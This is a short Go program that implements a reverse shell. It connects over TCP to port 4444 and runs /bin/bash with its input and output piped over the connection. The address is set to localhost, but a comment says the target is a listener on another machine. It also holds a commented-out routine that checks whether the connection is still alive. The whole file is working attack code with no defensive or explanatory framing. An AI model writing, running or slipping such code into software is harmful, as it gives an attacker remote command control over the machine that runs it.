package main

import (
    "fmt"
    "net"
    "os/exec"
    "os"
    //"io"
)

//executes a bash shell and pipes in/out/err over the connection
func createShell(connection net.Conn) {
    var message string = "successful connection from " + connection.LocalAddr().String()
    _, err := connection.Write([]byte(message + "\n"))
    if err != nil {
        fmt.Println("An error occurred trying to write to the outbound connection:", err)
        os.Exit(2)
    }

    cmd := exec.Command("/bin/bash")
    cmd.Stdin = connection
    cmd.Stdout = connection
    cmd.Stderr = connection

    cmd.Run()
}

func main() {
    var tcpPort string = "4444"
    connection, err := net.Dial("tcp", "127.0.0.1:" + tcpPort) //connect to the listener on another machine
    if err != nil {
        fmt.Println("An error occurred trying to connect to the target:", err)
        os.Exit(1)
    }
    fmt.Println("Successfully connected to the target")

    createShell(connection)
    /*for {
        checkConnection(connection)
    }*/
}

//constantly checks that the connection is still alive
/*func checkConnection(connection net.Conn) {
    buffer := make([]byte, 256)
    _,err := connection.Read(buffer)

    if err != nil {
        if err == io.EOF {
            fmt.Println("Connection was closed by remote host")
            connection.Close()
            os.Exit(3)
        } else {
            fmt.Println("An error occurred while checking the connection:", err)
            os.Exit(3)
        }
    }
}*/
